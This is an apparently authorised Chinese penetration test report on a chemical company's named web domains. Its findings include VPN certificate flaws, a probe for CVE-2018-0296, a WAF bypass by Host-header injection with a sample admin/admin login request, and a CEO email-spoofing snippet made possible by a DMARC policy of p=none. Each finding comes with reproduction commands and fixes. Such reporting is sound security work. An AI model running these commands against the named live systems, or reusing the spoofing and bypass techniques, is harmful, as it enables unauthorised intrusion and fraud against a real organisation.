1. 执行摘要

1.1 测试概述

受万华化学集团授权委托，于2026年5月27日对 *.whchem.com 域名范围进行了两阶段外部黑盒渗透测试。测试目标包括主网站、采购平台(SRM)、招投标平台(ebidding)、管道焊接管理系统(WMS)、农民工工资监管平台(FSMP)、VPN网关等约30个子域名和服务。

1.2 总体结论

整体风险等级: 高危

第一阶段被华为CloudWAF (长亭WAF) 的IP级访问控制完全阻断，仅能对无WAF保护的VPN网关进行测试。

第二阶段取得突破: 发现 ebidding.whchem.com:8043 上的nginx反向代理未受WAF保护，且接受任意Host头，成功绕过华为CloudWAF访问内部SRM采购平台后端API，发掘出高危WAF绕过漏洞及多个中危漏洞。

5. 详细漏洞发现

Phase 1 发现 (WHC-2026-001 ~ 005)

WHC-2026-001: Cisco ASA SSLVPN 自签名证书

严重程度: 中危 (CVSS 5.9) | CWE: CWE-295

目标: vpn.whchem.com, vpngw.whchem.com, vpnlt.whchem.com, vpncdn.whchem.com, vpnus.whchem.com

漏洞原理

五个Cisco ASA SSLVPN网关均使用设备默认生成的临时自签名证书（CN=ASA Temporary Self Signed Certificate），而非由受信任CA签发的正式证书。自签名证书无法通过标准PKI信任链验证，攻击者在能够拦截网络流量的条件下可伪造证书实施中间人攻击，窃取VPN登录凭据。

复现步骤

echo | openssl s_client -connect vpn.whchem.com:443 -servername vpn.whchem.com 2>&1 | grep "subject="
# subject=CN=ASA Temporary Self Signed Certificate
# issuer=CN=ASA Temporary Self Signed Certificate

WHC-2026-002: Cisco ASA WebVPN服务异常

严重程度: 中危 (CVSS 4.3) | CWE: CWE-248

漏洞原理

四个可访问的VPN网关在访问核心登录页面 /+CSCOE+/logon.html 时全部返回 "Internal Server Error"。

curl -sk "https://vpn.whchem.com/+CSCOE+/logon.html"
#  Internal Server Error

WHC-2026-003: CVE-2018-0296 目录遍历端点存活

严重程度: 中危 (CVSS 4.0) | CVE: CVE-2018-0296 | CWE: CWE-22

for vpn in vpn vpngw vpnlt vpncdn; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 \
    "https://${vpn}.whchem.com/+CSCOU+/../+CSCOE+/files/file_list.json?path=/")
  echo "${vpn}: HTTP $code"  # 全部返回 200
done

WHC-2026-004 + 005: WAF/CDN信息泄漏

严重程度: 低危 (CVSS 3.7 / 2.6) | CWE: CWE-200

华为CloudWAF拦截页面包含品牌标识和详细事件ID；HTTP Server头暴露CDN/WAF品牌（SLT、CW）。

curl -skI https://fsmp.whchem.com/login
# Server: CW | Set-Cookie: HWWAFSESID=... | HTTP 418

Phase 2 发现 (WHC-2026-006 ~ 010) NEW

WHC-2026-007: WAF绕过 — Host头注入导致内部服务暴露 关键发现

严重程度: 高危 (CVSS 7.5) | CWE: CWE-807 | 复现难度: 极低

目标: ebidding.whchem.com:8043 → srm.whchem.com

漏洞原理

ebidding.whchem.com:8043 上的nginx反向代理未受WAF保护，且接受任意Host头，将请求转发至对应的后端服务。通过构造 Host: srm.whchem.com 请求头访问，可完全绕过华为CloudWAF的IP层访问控制，直接访问万华采购平台及后端Spring Boot API。

漏洞链路:

攻击者 ──HTTPS──> ebidding.whchem.com:8043 (无WAF)
                      |
                      ├── Host: srm.whchem.com ──> srm后端 (绕过WAF)
                      |
                      └── 正常Host ──> default backend 404

复现步骤

# 步骤1: 确认正常WAF拦截
curl -skI https://srm.whchem.com/
# HTTP/1.1 418 — WAF拦截

# 步骤2: 通过ebidding:8043绕过WAF
curl -sk -H "Host: srm.whchem.com" https://ebidding.whchem.com:8043/
# 返回: 万华采购平台 完整HTML页面 (12567 bytes)

# 步骤3: 访问后端API
curl -sk -X POST \
  -H "Host: srm.whchem.com" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  https://ebidding.whchem.com:8043/api/login
# 返回: {"status":"error","errorMessage":"用户名或密码不正确",...}

已验证可访问的API端点: /api/login, /api/user, /api/menu, /api/role, /api/log, /api/file, /api/workflow, /service/, /service/UserService, /service/OrganizationService

影响评估

  1. WAF防护完全失效
  2. 攻击面大幅扩大 — 所有API端点暴露
  3. 暴力破解通道 — /api/login 无WAF限流
  4. 后续利用可能 — 获取凭证后可完全控制采购平台

修复建议 (短期)

server {
    listen 8043 ssl;
    server_name ebidding.whchem.com;
    if ($host !~* ^(ebidding\.whchem\.com)$) {
        return 403;
    }
}

WHC-2026-008: SRM采购平台内部后端端口与架构信息泄漏 NEW

严重程度: 中危 (CVSS 5.3) | CWE: CWE-200

利用条件: 结合WHC-2026-007 WAF绕过

漏洞原理

通过WAF绕过路径访问srm.whchem.com时，API响应暴露了内部架构信息：内部端口7774、Spring Boot技术栈确认、内部域名规范。

复现步骤

PROXY="https://ebidding.whchem.com:8043"
HOST="Host: srm.whchem.com"

curl -sk -H "$HOST" "$PROXY/api" -w "\nREDIRECT: %{redirect_url}"
# Location: http://srm.whchem.com:7774/api/

curl -sk -H "$HOST" "$PROXY/service/"
# {"timestamp":"2026-05-27T...","status":401,"error":"Unauthorized",...}

修复建议

proxy_redirect http://srm.whchem.com:7774/ https://srm.whchem.com/; + 后端错误信息拦截

WHC-2026-009: DMARC策略缺失导致邮件伪造漏洞 NEW

严重程度: 中危 (CVSS 5.3) | CWE: CWE-290 | 复现难度: 极低

目标: whchem.com 邮件系统

漏洞原理

whchem.com已部署SPF和DKIM，但DMARC策略设置为 p=none——明确要求收件服务器对验证失败的邮件不采取任何措施。

当前DNS配置:

SPF:    v=spf1 include:spf.corp-email.com ... -all  (硬拒绝)
DKIM:   s1._domainkey.whchem.com v=DKIM1; k=rsa; p=... (1024-bit RSA)
DMARC:  v=DMARC1; p=none; ...  ← 策略为none: 不采取任何措施!

复现步骤

dig _dmarc.whchem.com TXT +short
# "v=DMARC1; p=none; ruf=mailto:dmarc_report@whchem.com; ..."

# Python smtplib PoC
msg["From"] = formataddr(("CEO Name", "ceo@whchem.com"))
msg["Subject"] = "紧急：请处理以下付款"

修复建议

短期: p=quarantine; pct=50 → 中期: p=reject

WHC-2026-010: ebidding招投标系统弱TLS加密配置 NEW

严重程度: 中危 (CVSS 5.9) | CWE: CWE-326

目标: ebidding.whchem.com:8043

漏洞原理

ebidding.whchem.com:8043支持TLSv1.0/1.1 + CBC模式加密套件 + DH 1024-bit密钥交换。

协议加密套件密钥交换风险
TLSv1.0TLS_ECDHE_RSA_WITH_AES_128_CBC_SHAECDHEBEAST
TLSv1.0TLS_RSA_WITH_AES_128_CBC_SHARSA无前向保密
TLSv1.0TLS_DHE_RSA_WITH_AES_128_CBC_SHADH 1024弱DH
TLSv1.0TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHADH 1024Camellia+弱DH

特殊风险

ebidding是招投标系统，涉及供应商报价等敏感商业数据，弱TLS可能导致MITM窃取。

修复建议

ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers on;
ssl_dhparam /etc/nginx/dhparam.pem;  # 2048-bit DH
